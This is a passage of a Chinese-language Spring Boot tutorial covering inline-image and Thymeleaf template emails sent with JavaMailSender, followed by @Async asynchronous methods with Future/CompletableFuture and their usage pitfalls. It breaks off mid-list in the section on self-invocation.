<li><strong>核心机制</strong>：通过 <code>Content-ID</code> (cid) 将 HTML 中的 <code>&lt;img&gt;</code> 标签与邮件中的内联资源关联起来。</li>
</ul>
<p><strong>实现代码：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送一封带内联资源的邮件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> to 收件人地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> subject 邮件主题</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> imagePath 内联图片的路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendInlineResourceMail</span><span class="params">(String to, String subject, String imagePath)</span> &#123;</span><br><span class="line">    <span class="comment">// 这是我们的 HTML 邮件内容，注意看 img 标签的 src 属性</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">rscId</span> <span class="operator">=</span> <span class="string">&quot;logo001&quot;</span>; <span class="comment">// 定义一个内容ID (Content-ID)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">htmlContent</span> <span class="operator">=</span> <span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;&lt;h1&gt;这是一封带内联图片的邮件&lt;/h1&gt;&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;&lt;h3&gt;图片如下：&lt;/h3&gt;&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;&lt;img src=&#x27;cid:&quot;</span> + rscId + <span class="string">&quot;&#x27; /&gt;&quot;</span> + <span class="comment">// 使用 cid: 引用内联资源</span></span><br><span class="line">                         <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> mailSender.createMimeMessage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        helper.setFrom(fromEmail);</span><br><span class="line">        helper.setTo(to);</span><br><span class="line">        helper.setSubject(subject);</span><br><span class="line">        helper.setText(htmlContent, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加内联资源</span></span><br><span class="line">        <span class="type">FileSystemResource</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(imagePath));</span><br><span class="line">        <span class="comment">// 使用 addInline 方法，第一个参数是 Content-ID，必须与 HTML 中的 cid 一致</span></span><br><span class="line">        helper.addInline(rscId, res);</span><br><span class="line"></span><br><span class="line">        mailSender.send(mimeMessage);</span><br><span class="line">        System.out.println(<span class="string">&quot;内联资源邮件发送成功！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (MessagingException e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;发送内联资源邮件时发生异常: &quot;</span> + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-4-总结与对比"><a href="#3-2-4-总结与对比" class="headerlink" title="3.2.4 总结与对比"></a>3.2.4 总结与对比</h4><table>
<thead>
<tr>
<th align="left">邮件类型</th>
<th align="left">核心类&#x2F;辅助类</th>
<th align="left">关键方法&#x2F;步骤</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>简单文本邮件</strong></td>
<td align="left"><code>SimpleMailMessage</code></td>
<td align="left">直接设置 <code>from</code>, <code>to</code>, <code>subject</code>, <code>text</code> 属性。</td>
<td align="left">发送纯文本通知、验证码等。</td>
</tr>
<tr>
<td align="left"><strong>附件邮件</strong></td>
<td align="left"><code>MimeMessage</code> + <code>MimeMessageHelper</code></td>
<td align="left"><code>new MimeMessageHelper(mimeMessage, true)</code><br/><code>helper.addAttachment(...)</code></td>
<td align="left">发送报告、文档、合同等文件。</td>
</tr>
<tr>
<td align="left"><strong>内联资源邮件</strong></td>
<td align="left"><code>MimeMessage</code> + <code>MimeMessageHelper</code></td>
<td align="left"><code>helper.addInline(contentId, ...)</code><br/>在HTML中使用 <code>&lt;img src=&#39;cid:contentId&#39;&gt;</code></td>
<td align="left">创建图文并茂的营销邮件、欢迎邮件等。</td>
</tr>
</tbody></table>
<hr>
<h3 id="3-3-模板邮件发送"><a href="#3-3-模板邮件发送" class="headerlink" title="3.3 模板邮件发送"></a>3.3 模板邮件发送</h3><p>在前面的示例中，我们直接在 Java 代码中拼接 HTML 字符串来构建邮件内容。这种方式存在明显的问题：</p>
<ul>
<li><strong>难以维护</strong>：HTML 代码和 Java 逻辑混杂在一起，可读性差。如果邮件样式需要修改，就必须改动 Java 代码并重新编译部署。</li>
<li><strong>职责不清</strong>：开发人员需要关心邮件的视觉样式，而 UI&#x2F;UX 设计师无法直接参与邮件模板的设计。</li>
<li><strong>复用性差</strong>：无法轻松地复用邮件的布局和结构。</li>
</ul>
<p><strong>解决方案</strong>：使用<strong>模板引擎</strong>。模板引擎允许我们将邮件的结构和样式定义在独立的模板文件中，将动态数据与静态布局分离。在发送邮件时，程序会加载模板，用具体的数据填充模板中的占位符，最终生成完整的 HTML 内容。</p>
<p>Spring Boot 与多种模板引擎都能完美集成，其中最常用的是 <strong>Thymeleaf</strong> 和 <strong>FreeMarker</strong>。我们以 Thymeleaf 为例进行详细说明。</p>
<p><strong>核心流程</strong></p>
<ol>
<li><strong>添加依赖</strong>：引入模板引擎的 Starter。</li>
<li><strong>创建模板</strong>：在 <code>src/main/resources/templates/</code> 目录下创建一个 HTML 模板文件。</li>
<li><strong>处理模板</strong>：在 Java 代码中，注入 <code>TemplateEngine</code>，创建一个数据模型（<code>Context</code>），然后调用 <code>process</code> 方法来渲染模板，生成最终的 HTML 字符串。</li>
<li><strong>发送邮件</strong>：将生成的 HTML 字符串作为邮件正文发送。</li>
</ol>
<hr>
<h4 id="3-3-1-集成-Thymeleaf"><a href="#3-3-1-集成-Thymeleaf" class="headerlink" title="3.3.1 集成 Thymeleaf"></a>3.3.1 集成 Thymeleaf</h4><p>在 <code>pom.xml</code> 中添加 Thymeleaf 的 Starter。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-3-2-创建邮件模板"><a href="#3-3-2-创建邮件模板" class="headerlink" title="3.3.2 创建邮件模板"></a>3.3.2 创建邮件模板</h4><p>在 <code>src/main/resources/templates/</code> 目录下创建一个名为 <code>mailTemplate.html</code> 的文件。Thymeleaf 的语法非常自然，可以直接用浏览器打开预览。</p>
<p><strong><code>mailTemplate.html</code> 示例：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>邮件模板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>您好, <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>欢迎您注册我们的服务！这是您的验证码：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: blue; font-weight: bold; font-size: 20px;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;verificationCode&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请在5分钟内使用。如果您没有请求此验证码，请忽略本邮件。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>感谢您的支持！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>-- Spring Boot 团队<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>xmlns:th=&quot;http://www.thymeleaf.org&quot;</code>: 引入 Thymeleaf 的命名空间。</li>
<li><code>th:text=&quot;${...}&quot;</code>: 这是 Thymeleaf 的核心语法，用于将 <code>${...}</code> 中变量的值替换掉标签内的文本。<code>${username}</code> 和 <code>${verificationCode}</code> 就是我们稍后需要从 Java 代码中传入的动态数据。</li>
</ul>
<hr>
<h4 id="3-3-3-实现模板邮件发送服务"><a href="#3-3-3-实现模板邮件发送服务" class="headerlink" title="3.3.3 实现模板邮件发送服务"></a>3.3.3 实现模板邮件发送服务</h4><p>在 <code>MailService</code> 中，我们需要注入 Thymeleaf 的 <code>TemplateEngine</code>，并创建一个新方法来处理和发送模板邮件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MailService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JavaMailSender mailSender;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TemplateEngine templateEngine; <span class="comment">// 注入模板引擎</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fromEmail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送基于 Thymeleaf 模板的邮件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> to 收件人</span></span><br><span class="line"><span class="comment">     *   subject 主题</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 用户名 (模板中的变量)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> verificationCode 验证码 (模板中的变量)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendTemplateMail</span><span class="params">(String to, String subject, String username, String verificationCode)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建一个 Thymeleaf 的上下文对象 (Context)</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Context</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 设置模板中需要替换的变量</span></span><br><span class="line">        context.setVariable(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        context.setVariable(<span class="string">&quot;verificationCode&quot;</span>, verificationCode);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 使用模板引擎渲染模板，生成最终的 HTML 字符串</span></span><br><span class="line">        <span class="comment">// 第一个参数是模板文件的名称 (相对于 templates/ 目录，无需 .html 后缀)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">emailContent</span> <span class="operator">=</span> templateEngine.process(<span class="string">&quot;mailTemplate&quot;</span>, context);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 创建 MimeMessage 并发送</span></span><br><span class="line">        <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> mailSender.createMimeMessage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span class="literal">true</span>);</span><br><span class="line">            helper.setFrom(fromEmail);</span><br><span class="line">            helper.setTo(to);</span><br><span class="line">            helper.setSubject(subject);</span><br><span class="line">            helper.setText(emailContent, <span class="literal">true</span>); <span class="comment">// true 表示内容是 HTML</span></span><br><span class="line"></span><br><span class="line">            mailSender.send(mimeMessage);</span><br><span class="line">            System.out.println(<span class="string">&quot;模板邮件发送成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessagingException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;发送模板邮件时发生异常: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优势与最佳实践</strong></p>
<ul>
<li><strong>彻底的职责分离</strong>：设计师可以专注于 <code>mailTemplate.html</code> 的美化，而程序员只需关心如何准备数据和调用发送逻辑。</li>
<li><strong>代码整洁</strong>：Java 代码中不再有大段的、丑陋的 HTML 字符串。</li>
<li><strong>国际化 (i18n)</strong>：Thymeleaf 等模板引擎通常具有强大的国际化支持。你可以为不同语言创建不同的模板或资源文件，根据用户的语言环境发送相应语言的邮件。</li>
<li><strong>逻辑处理</strong>：模板引擎通常支持条件判断（<code>th:if</code>）、循环（<code>th:each</code>）等简单逻辑，可以构建非常复杂的动态邮件内容（如订单确认邮件中的商品列表）。</li>
<li><strong>异步发送</strong>：模板渲染和邮件发送都应该是异步的。在 <code>sendTemplateMail</code> 方法上添加 <code>@Async</code> 注解，可以确保用户请求被立即响应，而耗时的邮件任务在后台执行。</li>
</ul>
<hr>
<h2 id="4-异步执行-Asynchronous-Execution"><a href="#4-异步执行-Asynchronous-Execution" class="headerlink" title="4. 异步执行 (Asynchronous Execution)"></a>4. 异步执行 (Asynchronous Execution)</h2><p>在同步执行模型中，当一个方法被调用时，调用者必须等待该方法完全执行完毕并返回结果后，才能继续执行后续的代码。对于一些耗时较长的操作（如文件上传、数据批量处理、发送邮件&#x2F;短信、调用慢速的第三方 API），这种同步等待会严重影响系统性能和用户体验，导致线程长时间阻塞，降低系统的吞吐量。</p>
<p>异步执行则解决了这个问题。它允许将耗时的任务提交给一个独立的后台线程（通常来自一个线程池）来执行，而调用者线程则可以立即返回，继续处理其他事情，无需等待。</p>
<p><strong>核心优势：</strong></p>
<ul>
<li><strong>提升响应速度</strong>：特别是在 Web 应用中，可以将非核心的耗时操作异步化，从而快速响应用户请求，改善用户体验。</li>
<li><strong>提高系统吞吐量</strong>：通过将任务分配给专门的线程池，可以更有效地利用 CPU 资源，并发处理更多任务。</li>
<li><strong>任务解耦</strong>：将主流程与耗时任务解耦，使系统架构更清晰、更具弹性。</li>
</ul>
<p>Spring 框架通过 <code>@Async</code> 注解，提供了一种非侵入式的、声明式的方式来实现方法的异步调用。</p>
<h3 id="4-1-Async-注解"><a href="#4-1-Async-注解" class="headerlink" title="4.1 @Async 注解"></a>4.1 <code>@Async</code> 注解</h3><p><code>@Async</code> 是 Spring 提供的一个方法级别的注解。当它被应用到一个方法上时，Spring 会为该方法创建一个代理。当这个被代理的方法被调用时，Spring 会将实际的方法执行逻辑提交到一个线程池中异步执行，并立即返回一个 <code>Future</code> 对象给调用者。</p>
<h4 id="4-1-1-开启异步支持"><a href="#4-1-1-开启异步支持" class="headerlink" title="4.1.1 开启异步支持"></a>4.1.1 开启异步支持</h4><p>要使 <code>@Async</code> 注解生效，必须在 Spring Boot 的主启动类或任何一个配置类（<code>@Configuration</code>）上添加 <code>@EnableAsync</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableAsync</span> <span class="comment">// 开启异步方法执行功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@EnableAsync</code> 注解会激活 Spring 对 <code>@Async</code> 注解的发现和代理机制。</p>
<h4 id="4-1-2-创建异步方法"><a href="#4-1-2-创建异步方法" class="headerlink" title="4.1.2 创建异步方法"></a>4.1.2 创建异步方法</h4><p>在一个 Spring Bean 中（如 <code>@Service</code> 或 <code>@Component</code>），将 <code>@Async</code> 注解添加到需要异步执行的 public 方法上。</p>
<h5 id="1-无返回值的异步方法-void"><a href="#1-无返回值的异步方法-void" class="headerlink" title="1. 无返回值的异步方法 (void)"></a>1. 无返回值的异步方法 (<code>void</code>)</h5><p>这是最简单的异步场景，常用于“执行并忘记”(fire-and-forget) 的任务，如记录日志、发送通知等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.Async;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncTaskService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Async</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始发送邮件... 当前线程: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 模拟耗时 3 秒</span></span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;邮件发送完成！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AsyncTaskService asyncTaskService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test-async&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testAsync</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Controller 开始执行... 当前线程: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        asyncTaskService.sendEmail(); <span class="comment">// 立即返回，不会等待 3 秒</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Controller 执行完毕！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Async task submitted!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>执行结果分析</strong>：</p>
<p>访问 <code>/test-async</code> 接口，你会立即在控制台看到：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Controller 开始执行... 当前线程: http-nio-8080-exec-1</span><br><span class="line">Controller 执行完毕！</span><br><span class="line">开始发送邮件... 当前线程: task-1  &lt;-- 注意！线程名变了</span><br></pre></td></tr></table></figure>

<p>大约 3 秒后，才会看到：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">邮件发送完成！</span><br></pre></td></tr></table></figure>

<p>这证明了 <code>sendEmail()</code> 方法是在一个名为 <code>task-1</code> 的后台线程中执行的，而主线程 <code>http-nio-8080-exec-1</code> 没有被阻塞。</p>
</blockquote>
<hr>
<h5 id="2-有返回值的异步方法-Future-CompletableFuture"><a href="#2-有返回值的异步方法-Future-CompletableFuture" class="headerlink" title="2. 有返回值的异步方法 (Future &#x2F; CompletableFuture)"></a>2. 有返回值的异步方法 (<code>Future</code> &#x2F; <code>CompletableFuture</code>)</h5><p>如果调用者需要获取异步任务的执行结果（或检查其执行状态），异步方法的返回值类型必须是 <code>java.util.concurrent.Future</code>、<code>java.util.concurrent.CompletableFuture</code> 或 Spring 的 <code>org.springframework.util.concurrent.ListenableFuture</code>。</p>
<p><code>CompletableFuture</code> (Java 8+) 是目前推荐的方式，因为它功能更强大，支持链式调用和回调。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncTaskService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Async</span></span><br><span class="line">    <span class="keyword">public</span> CompletableFuture&lt;String&gt; <span class="title function_">fetchUserData</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;开始获取用户数据... 当前线程: &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 模拟耗时 5 秒</span></span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;User data fetched successfully!&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;用户数据获取完成！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> CompletableFuture.completedFuture(result); <span class="comment">// 将结果包装在 CompletableFuture 中返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callAsyncWithResult</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;开始调用异步任务...&quot;</span>);</span><br><span class="line">    CompletableFuture&lt;String&gt; future = asyncTaskService.fetchUserData();</span><br><span class="line">    System.out.println(<span class="string">&quot;异步任务已提交，主线程继续执行其他事情...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 在这里可以做其他工作 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当需要结果时，调用 get() 方法阻塞等待</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> future.get(); <span class="comment">// 这行会阻塞，直到异步任务完成</span></span><br><span class="line">    System.out.println(<span class="string">&quot;获取到异步任务的结果: &quot;</span> + result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-1-3-重要使用规则与陷阱"><a href="#4-1-3-重要使用规则与陷阱" class="headerlink" title="4.1.3 重要使用规则与陷阱"></a>4.1.3 重要使用规则与陷阱</h4><p><code>@Async</code> 的实现依赖于 Spring AOP 代理，因此必须遵守 AOP 的使用规则，否则注解会失效：</p>
<ol>
<li><p><strong>只能应用于 public 方法</strong>：<code>@Async</code> 对 <code>protected</code>、<code>private</code> 或包级私有的方法无效。</p>
</li>
<li><p><strong>方法必须定义在 Spring Bean 中</strong>：该方法所在的类必须被 Spring 容器管理（例如，有 <code>@Service</code>, <code>@Component</code> 等注解）。</p>
</li>
<li><p><strong>避免类内部调用 (self-invocation)</strong>：</p>
<ul>
<li><p><strong>错误示例</strong>：在同一个类中，一个 <code>public</code> 方法调用同一个类的另一个 <code>@Async</code> 方法，异步会失效。</p>
